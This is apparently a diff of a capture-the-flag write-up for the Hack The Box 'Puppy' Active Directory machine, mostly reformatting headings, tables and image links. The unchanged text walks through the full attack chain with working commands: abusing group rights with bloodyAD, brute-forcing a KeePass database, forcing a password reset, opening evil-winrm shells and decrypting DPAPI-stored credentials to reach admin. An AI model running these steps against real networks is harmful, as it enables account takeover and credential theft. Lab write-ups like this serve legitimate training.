@@ -2,33 +2,29 @@
 sticker: emoji//1f436
 ---
 
-# PUPPY
+# PORT SCAN
+---
 
-## PORT SCAN
-
-***
-
-| PORT     | SERVICE                                     |
-| -------- | ------------------------------------------- |
-| 53/tcp   | domain (Simple DNS Plus)                    |
-| 88/tcp   | kerberos-sec (Microsoft Windows Kerberos)   |
-| 111/tcp  | rpcbind (2-4, RPC #100000)                  |
-| 135/tcp  | msrpc (Microsoft Windows RPC)               |
+| PORT     | SERVICE                |
+|----------|------------------------|
+| 53/tcp   | domain (Simple DNS Plus) |
+| 88/tcp   | kerberos-sec (Microsoft Windows Kerberos) |
+| 111/tcp  | rpcbind (2-4, RPC #100000) |
+| 135/tcp  | msrpc (Microsoft Windows RPC) |
 | 139/tcp  | netbios-ssn (Microsoft Windows netbios-ssn) |
-| 389/tcp  | ldap (AD LDAP - PUPPY.HTB0)                 |
-| 445/tcp  | microsoft-ds?                               |
-| 464/tcp  | kpasswd5?                                   |
-| 593/tcp  | ncacn\_http (RPC over HTTP 1.0)             |
-| 636/tcp  | tcpwrapped                                  |
-| 2049/tcp | nlockmgr (1-4, RPC #100021)                 |
-| 3260/tcp | iscsi?                                      |
-| 3268/tcp | ldap (AD LDAP - PUPPY.HTB0)                 |
-| 3269/tcp | tcpwrapped                                  |
-| 5985/tcp | http (Microsoft HTTPAPI httpd 2.0)          |
+| 389/tcp  | ldap (AD LDAP - PUPPY.HTB0) |
+| 445/tcp  | microsoft-ds?          |
+| 464/tcp  | kpasswd5?              |
+| 593/tcp  | ncacn_http (RPC over HTTP 1.0) |
+| 636/tcp  | tcpwrapped             |
+| 2049/tcp | nlockmgr (1-4, RPC #100021) |
+| 3260/tcp | iscsi?                 |
+| 3268/tcp | ldap (AD LDAP - PUPPY.HTB0) |
+| 3269/tcp | tcpwrapped             |
+| 5985/tcp | http (Microsoft HTTPAPI httpd 2.0) |
 
-## RECONNAISSANCE
-
-***
+# RECONNAISSANCE
+---
 
 As always, we are provided with credentials:
 
@@ -62,7 +58,7 @@ SMB1 disabled -- no workgroup available
 
 As seen, there's a `DEV` share on here, let's try to read it:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610141456.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610141456.png)
 
 Unfortunately, we are unable to read this share, let's end `smb` enumeration for now, we can now proceed to use `nxc` to enumerate usernames on the domain:
 
@@ -82,6 +78,7 @@ SMB         10.10.11.70     445    DC               steph.cooper                
 SMB         10.10.11.70     445    DC               steph.cooper_adm              2025-03-08 15:50:40 0
 SMB         10.10.11.70     445    DC               [*] Enumerated 9 local users: PUPPY
 ```
+
 
 Nice, got some usernames, time to use bloodhound to check what can we do:
 
@@ -109,6 +106,7 @@ INFO: Done in 00M 18S
 INFO: Compressing output into 20250610193934_bloodhound.zip
 ```
 
+
 Nice, we got our zip file, let's open bloodhound and check the data:
 
 > Note: If you want to flush all previous data from bloodhound, you can go to `http://localhost:7474` and perform the following query:
@@ -118,15 +116,15 @@ MATCH (n)
 DETACH DELETE n
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610150847.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610150847.png)
 
-Now, as seen our current user is member of `HR` which has `GenericWrite` on `DEVELOPERS`, in this way, we may be able to read the `DEV` share we found at the start, let's abuse this `GenericWrite` privilege.
+Now, as seen our current user is member of `HR` which has `GenericWrite` on `DEVELOPERS`, in this way, we may be able to read the `DEV` share we found at the start, let's abuse this `GenericWrite` privilege. 
 
 Time to begin exploitation.
 
-## EXPLOITATION
 
-***
+# EXPLOITATION
+---
 
 We already know the first thing we must do, since we were unable to read the share if we are a member of the developers group we must be able to read it now, let's use `bloodyAD` for it, refer to this fantastic article on how to exploit `GenericWrite DACL`:
 
@@ -135,6 +133,7 @@ Link: https://www.hackingarticles.in/genericwrite-active-directory-abuse/
 ```python
 bloodyAD -u levi.james -d puppy.htb -p 'KingofAkron2025!' --host 10.10.11.70 add groupMember DEVELOPERS levi.james
 ```
+
 
 We can check the user was successfully added to the group using `net rpc`:
 
@@ -146,20 +145,23 @@ PUPPY\adam.silver
 PUPPY\jamie.williams
 ```
 
+
 Nice, it worked, we can now access the `DEV` share:
 
 ```
 smbclient -U 'puppy.htb/levi.james%KingofAkron2025!' //10.10.11.70/DEV
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610153416.png)
 
-As seen, we are now able to check the share, the most important stuff on here is the `recovery.kdbx` file, this is the `keepass` password database file, let's get it
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610153416.png)
+
+As seen, we are now able to check the share, the most important stuff on here is the `recovery.kdbx` file, this is the `keepass` password database file, let's get it 
 
 ```
 smb: \> get recovery.kdbx
 getting file \recovery.kdbx of size 2677 as recovery.kdbx (6.6 KiloBytes/sec) (average 6.6 KiloBytes/sec)
 ```
+
 
 Keepass databases are encrypted which means we need to use `john` to crack the master password, for this, we can use `keepass2john`:
 
@@ -170,11 +172,13 @@ keepass2john recovery.kdbx > hash.txt
 
 We got an error, let's check it up:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610153719.png) ![](gitbook/cybersecurity/images/Pasted%20image%2020250610153816.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610153719.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610153816.png)
 
 Seems like we can use `keepass4brute`, since we need another version of john to perform the cracking, let's download the tool and try to crack the master password:
 
 REPO: https://github.com/r3nt0n/keepass4brute
+
 
 Before we start the script, we need to install `keepassxc`, if you're on arch you can do:
 
@@ -187,6 +191,7 @@ Otherwise, on kali do:
 ```
 sudo apt update && sudo apt install keepassxc
 ```
+
 
 Once we got it we can now run the script:
 
@@ -213,23 +218,24 @@ Now, let's access the keepass db:
 keepassxc recovery.kdbx
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610154330.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610154330.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610154342.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610154342.png)
 
 On here, we can see a bunch of credentials:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610154435.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610154435.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610154443.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610154443.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610154452.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610154452.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610154500.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610154500.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610154508.png)
 
-We need to go back to bloodhound to check what can we do with these new credentials for the users,
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610154508.png)
+
+We need to go back to bloodhound to check what can we do with these new credentials for the users, 
 
 ```
 steve.tucker: Steve2025!
@@ -264,15 +270,16 @@ done < "$CREDS_FILE"
 
 Save the above credentials as `creds.txt` and use the script, you will get this output:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610155849.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610155849.png)
 
 The only user that we can authenticate with is the `ant.edwards` user all other users bring up `STATUS_LOGON_FAILURE`, if we check it up on bloodhound, we can find this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610155938.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610155938.png)
+
 
 As seen, `ant.edwards` is member of `senior devs` which got `GenericAll` over `Adam.Silver` user, abusing this we can force the password change for the user:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610160308.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610160308.png)
 
 We can use `bloodyAD` again:
 
@@ -282,6 +289,7 @@ bloodyAD -u ant.edwards -p 'Antman2025!' -d puppy.htb --dc-ip 10.10.11.70 set pa
 ```
 
 Ok, if we try to go to `winrm` right now, we are unable to do so, this happens because the account is `disabled`, we can check this by using `ldapsearch`:
+
 
 ```python
 ldapsearch -x -D 'ant.edwards@puppy.htb' -w 'Antman2025!' -H ldap://10.10.11.70 -b 'DC=puppy,DC=htb' "(sAMAccountName=adam.silver)" userAccountControl
@@ -337,13 +345,14 @@ Nice, let's try going into `evil-winrm` now:
 evil-winrm -i 10.10.11.70 -u 'adam.silver' -p 'abc@123'
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610161747.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610161747.png)
 
 Perfect, we were successfully able to get a session, let's proceed to privilege escalation.
 
-## PRIVILEGE ESCALATION
 
-***
+
+# PRIVILEGE ESCALATION
+---
 
 If we check `C:\` we can find this:
 
@@ -389,7 +398,7 @@ download 'C:\Backups\site-backup-2024-12-30.zip'
 
 Once we got the file, we can find this inside of it:
 
-```xml
+```XML
 assets  images  index.html  nms-auth-config.xml.bak
 
 cat nms-auth-config.xml.bak 
@@ -692,6 +701,7 @@ Current LogonId is 0:0x280ed4
 Cached Tickets: (0)
 ```
 
+
 If we analyze the output, at the last part we can see this:
 
 ```powershell
@@ -783,7 +793,8 @@ Mode                 LastWriteTime         Length Name
 ----                 -------------         ------ ----
 -a-hs-          3/8/2025   7:40 AM            740 556a2412-1275-4ccf-b721-e6a0b4f90407
 -a-hs-         2/23/2025   2:36 PM             24 Preferred
-```
+``` 
+
 
 We can find our master key on there, let's download it again:
 
@@ -841,7 +852,7 @@ Unknown     : FivethChipOnItsWay2025!
 
 There we go, we got credentials for `steph.cooper_adm`, this is an admin user we know this due to bloodhound:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610181952.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610181952.png)
 
 We can now access `winrm` as the admin user:
 
@@ -849,7 +860,7 @@ We can now access `winrm` as the admin user:
 evil-winrm -i 10.10.11.70 -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!'
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610182214.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610182214.png)
 
 Let's read both flags and end the CTF:
 
@@ -861,6 +872,8 @@ Let's read both flags and end the CTF:
 994702fce26ced9214c2669e92f0c333
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610182434.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610182434.png)
 
 https://www.hackthebox.com/achievement/machine/1872557/661
+
+
